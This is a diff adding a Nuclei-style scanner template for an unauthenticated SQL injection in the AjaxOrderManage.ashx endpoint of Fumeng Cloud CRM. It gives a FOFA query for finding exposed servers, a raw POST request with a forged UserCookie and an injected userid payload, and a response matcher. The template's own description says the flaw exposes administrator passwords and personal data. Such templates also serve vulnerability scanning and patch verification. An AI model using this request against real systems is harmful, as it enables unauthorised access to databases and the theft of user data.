@@ -1,0 +1,28 @@
+id: fumeng-cloud-crm-ajaxordermanage-sqli
+
+info:
+  name: 孚盟云CRM AjaxOrderManage.ashx接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="孚盟软件-孚盟云"
+          上海孚盟软件有限公司为外贸SaaS服务及行业解决方案提供商，其孚盟云CRM系统AjaxOrderManage.ashx接口存在SQL注入安全缺陷。攻击者可通过该漏洞在未认证的情况下执行SQL注入攻击，可能导致数据库信息泄露（包括管理员后台密码、用户个人信息等敏感数据），在特定权限条件下可进一步实施服务器代码执行或权限提升操作。
+  tags: 孚盟云CRM
+
+http:
+- raw:
+  - |
+    POST /m/Dingding/Ajax/AjaxOrderManage.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: UserCookie={"empId":"1"}
+    Content-Type: application/x-www-form-urlencoded
+
+    action=getsalesfunnel&userid='-1/user--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - '用户'
